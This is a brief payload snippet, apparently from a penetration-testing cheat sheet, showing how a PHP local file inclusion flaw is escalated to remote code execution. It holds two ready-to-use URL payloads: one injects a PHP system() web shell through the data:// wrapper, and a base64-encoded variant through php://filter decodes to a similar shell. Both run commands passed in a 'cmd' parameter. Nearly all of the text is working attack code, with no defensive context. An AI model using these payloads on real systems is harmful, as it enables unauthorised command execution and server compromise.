***

Simple case in which LFI can be leveraged for RCE
```
http://example/file.php?page=data://plain/text,<?php system($_GET['cmd']); ?><&cmd=id
```

Also you can test base64 encoding
```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=id
```